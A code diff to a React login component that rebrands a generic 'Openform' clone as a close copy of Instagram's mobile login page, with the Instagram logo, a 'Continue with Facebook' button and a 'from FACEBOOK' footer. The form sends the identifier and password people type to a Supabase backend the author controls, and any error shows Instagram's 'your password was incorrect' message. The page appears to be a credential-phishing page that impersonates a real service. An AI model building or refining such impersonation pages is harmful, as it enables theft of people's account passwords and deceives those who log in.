@@ -2,11 +2,6 @@ import { useState } from 'react'
 import { supabase } from './lib/supabase'
 import './App.css'
 
-const FOOTER_LINKS = [
-  'Meta', 'About', 'Blog', 'Jobs', 'Help', 'API', 'Privacy', 'Terms',
-  'Locations', 'Openform Lite', 'Threads', 'Contact uploading', 'Verified',
-]
-
 function App() {
   const [identifier, setIdentifier] = useState('')
   const [password, setPassword] = useState('')
@@ -15,7 +10,6 @@ function App() {
   const [message, setMessage] = useState('')
   const [success, setSuccess] = useState(false)
 
-  // Instagram enables the button once the password hits 6 characters
   const canSubmit = identifier.trim() !== '' && password.length >= 6
 
   const handleSubmit = async (event) => {
@@ -29,7 +23,6 @@ function App() {
         email: identifier.trim(),
         password,
       })
-
       if (error) throw error
 
       setSuccess(true)
@@ -37,7 +30,7 @@ function App() {
     } catch (error) {
       console.error('Login error:', error)
       setMessage(
-        "Sorry, your password was incorrect. Please double-check your password."
+        'Sorry, your password was incorrect. Please double-check your password.'
       )
     } finally {
       setLoading(false)
@@ -46,115 +39,85 @@ function App() {
 
   return (
     <main className="page">
-      <div className="content">
-        <div className="phones" aria-hidden="true">
-          <div className="phone phone-back">
-            <div className="phone-screen shot-1" />
-          </div>
-          <div className="phone phone-front">
-            <div className="phone-screen shot-2" />
-          </div>
+      <div className="screen">
+        <div className="language">English ⌄</div>
+
+        <h1 className="logo">Instagram</h1>
+
+        <button type="button" className="fb-btn">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff" aria-hidden="true">
+            <path d="M22 12a10 10 0 1 0-11.56 9.88v-6.99H7.9V12h2.54V9.8c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56V12h2.78l-.44 2.89h-2.34v6.99A10 10 0 0 0 22 12z" />
+          </svg>
+          Continue with Facebook
+        </button>
+
+        <div className="separator">
+          <span />
+          <p>OR</p>
+          <span />
         </div>
 
-        <div className="login-container">
-          <form className="form-card" onSubmit={handleSubmit}>
-            <h1 className="logo">Openform</h1>
+        <form onSubmit={handleSubmit}>
+          <div className="field">
+            <input
+              type="text"
+              placeholder="phone number, username, or email"
+              value={identifier}
+              onChange={(e) => setIdentifier(e.target.value)}
+              autoComplete="username"
+              maxLength={100}
+            />
+          </div>
 
-            <div className="field">
-              <input
-                id="identifier"
-                type="text"
-                placeholder=" "
-                value={identifier}
-                onChange={(e) => setIdentifier(e.target.value)}
-                autoComplete="username"
-                maxLength={100}
-              />
-              <label htmlFor="identifier">Phone number, username, or email</label>
-            </div>
-
-            <div className="field">
-              <input
-                id="password"
-                type={showPassword ? 'text' : 'password'}
-                placeholder=" "
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                autoComplete="current-password"
-                className="has-toggle"
-              />
-              <label htmlFor="password">Password</label>
-
-              {password && (
-                <button
-                  type="button"
-                  className="show-btn"
-                  onClick={() => setShowPassword((s) => !s)}
-                >
-                  {showPassword ? 'Hide' : 'Show'}
-                </button>
-              )}
-            </div>
-
-            <button
-              type="submit"
-              className="submit-btn"
-              disabled={loading || !canSubmit}
-            >
-              {loading ? 'Logging in...' : 'Log in'}
-            </button>
-
-            <div className="separator">
-              <span />
-              <p>OR</p>
-              <span />
-            </div>
-
-            <a className="alt-login" href="#!">Log in with Facebook</a>
-
-            {message && (
-              <p
-                role="status"
-                className={`form-message ${success ? 'success' : 'error'}`}
+          <div className="field">
+            <input
+              type={showPassword ? 'text' : 'password'}
+              placeholder="password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              autoComplete="current-password"
+              className={password ? 'has-toggle' : ''}
+            />
+            {password && (
+              <button
+                type="button"
+                className="show-btn"
+                onClick={() => setShowPassword((s) => !s)}
               >
-                {message}
-              </p>
+                {showPassword ? 'Hide' : 'Show'}
+              </button>
             )}
-
-            <a className="forgot" href="#!">Forgot password?</a>
-          </form>
-
-          <div className="signup-card">
-            Don't have an account? <a href="#!">Sign up</a>
           </div>
 
-          <div className="get-app">
-            <p>Get the app.</p>
-            <div className="badges">
-              <a href="#!" className="badge">
-                <small>Download on the</small>
-                <strong>App Store</strong>
-              </a>
-              <a href="#!" className="badge">
-                <small>GET IT ON</small>
-                <strong>Google Play</strong>
-              </a>
-            </div>
-          </div>
-        </div>
+          <a className="forgot" href="#!">Forgot password?</a>
+
+          <button
+            type="submit"
+            className="submit-btn"
+            disabled={loading || !canSubmit}
+          >
+            {loading ? 'Logging in...' : 'Log In'}
+          </button>
+
+          {message && (
+            <p
+              role="status"
+              className={`form-message ${success ? 'success' : 'error'}`}
+            >
+              {message}
+            </p>
+          )}
+        </form>
+
+        <p className="signup">
+          Don't have an account? <a href="#!">sign up</a>
+        </p>
+
+        <footer>
+          <span>from</span>
+          <strong>FACEBOOK</strong>
+        </footer>
       </div>
-
-      <footer>
-        <nav>
-          {FOOTER_LINKS.map((link) => (
-            <a key={link} href="#!">{link}</a>
-          ))}
-        </nav>
-        <div className="footer-bottom">
-          <span>English ▾</span>
-          <span>© 2026 Openform</span>
-        </div>
-      </footer>
     </main>
   )
 }
